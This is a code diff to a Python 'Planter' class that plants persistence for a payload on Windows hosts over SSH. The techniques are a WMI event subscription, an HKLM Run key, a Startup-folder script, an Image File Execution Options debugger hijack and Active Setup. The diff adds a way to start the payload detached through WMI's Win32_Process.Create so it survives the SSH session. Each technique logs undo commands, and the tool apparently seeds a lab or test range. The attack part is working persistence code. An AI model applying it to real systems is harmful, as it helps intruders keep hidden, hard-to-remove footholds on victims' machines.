@@ -329,8 +329,7 @@ class Planter:
         # agent once, detached, so the channel is live inside this seed window.
         alive = self._win_process_running(ip, fh, Path(staged).name)
         if not alive:
-            self._win(ip, fh,
-                      f'cmd /c start "" /b "{remote}"')
+            self._start_detached(ip, fh, remote)
             deadline = self._now() + 20
             while not alive and self._now() < deadline:
                 time.sleep(3)
@@ -363,6 +362,29 @@ class Planter:
         """Run one cmd/powershell line on a Windows box over its SSH channel."""
         return self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", command,
                                 timeout=timeout, key_path=fh.get("key_path"))
+
+    def _start_detached(self, ip, fh, remote):
+        """Start the payload OUTSIDE the SSH session.
+
+        Children of an OpenSSH session are killed with it (ssd's job object takes
+        the tree down when the channel closes), so `start "" /b` proved nothing:
+        the process was there while the plant looked and gone by the next command.
+        Win32_Process.Create spawns under the WMI service — session 0, detached,
+        the same way the scheduled task and the WMI subscription start it.
+        """
+        q = '"'      # the payload path has spaces; CIM wants it quoted
+        body = ("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
+                "-Arguments @{CommandLine='" + q + remote + q + "'} | "
+                "Select-Object -ExpandProperty ReturnValue")
+        return self._win_ps(ip, fh, body, timeout=90)
+
+    @staticmethod
+    def _why(rc, err, out):
+        """`rc=0` or `rc=1: <the first line PowerShell actually said>`."""
+        if rc == 0:
+            return "rc=0"
+        text = " ".join((err or out or "").split())[:120]
+        return f"rc={rc}" + (f": {text}" if text else "")
 
     def _win_process_running(self, ip, fh, image):
         _rc, out, _err = self._win(
@@ -434,7 +456,7 @@ class Planter:
             "Set-WmiInstance -Namespace root\\subscription -Class "
             "__FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null")
         rc, out, err = self._win_ps(ip, fh, body, timeout=180)
-        return {"detail": f"WMI subscription {name} rc={rc}",
+        return {"detail": f"WMI subscription {name} " + self._why(rc, err, out),
                 "paths": [f"wmi:{name}"],
                 "undo": [f"Get-WmiObject -Namespace root\\subscription -Class "
                          f"__FilterToConsumerBinding | Where-Object {{ "
@@ -451,7 +473,7 @@ class Planter:
             ip, fh, f"Set-ItemProperty -LiteralPath "
                     f"'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
                     f"-Name '{value}' -Value '{guard}' -Force", timeout=90)
-        return {"detail": f"HKLM Run value {value} rc={rc}",
+        return {"detail": f"HKLM Run value {value} " + self._why(rc, err, out),
                 "paths": [f"registry:HKLM\\...\\Run\\{value}"],
                 "undo": [f'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion'
                          f'\\Run" /v "{value}" /f']}
@@ -464,7 +486,7 @@ class Planter:
             ip, fh, f"Set-Content -LiteralPath 'C:\\ProgramData\\Microsoft\\Windows"
                     f"\\Start Menu\\Programs\\Startup\\{name}.cmd' -Value '{body}' "
                     f"-Encoding ascii", timeout=90)
-        return {"detail": f"startup item {name}.cmd rc={rc}",
+        return {"detail": f"startup item {name}.cmd " + self._why(rc, err, out),
                 "paths": [cmd],
                 "undo": [f'Remove-Item -Path \'{cmd}\' -Force']}
 
@@ -478,7 +500,7 @@ class Planter:
             ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
                     f"Set-ItemProperty -LiteralPath '{key}' -Name Debugger "
                     f"-Value '{remote}' -Force", timeout=90)
-        return {"detail": f"IFEO debugger on {target} rc={rc}",
+        return {"detail": f"IFEO debugger on {target} " + self._why(rc, err, out),
                 "paths": [f"registry:{key}\\Debugger"],
                 "undo": [f'reg delete "{key}" /v Debugger /f']}
 
@@ -494,7 +516,7 @@ class Planter:
                     f"-Value '{stub}' -Force; "
                     f"Set-ItemProperty -LiteralPath '{key}' -Name Version "
                     f"-Value '1,0,0,0' -Force", timeout=90)
-        return {"detail": f"Active Setup {guid} rc={rc}",
+        return {"detail": f"Active Setup {guid} " + self._why(rc, err, out),
                 "paths": [f"registry:{key}"],
                 "undo": [f'reg delete "{key}" /f']}
 
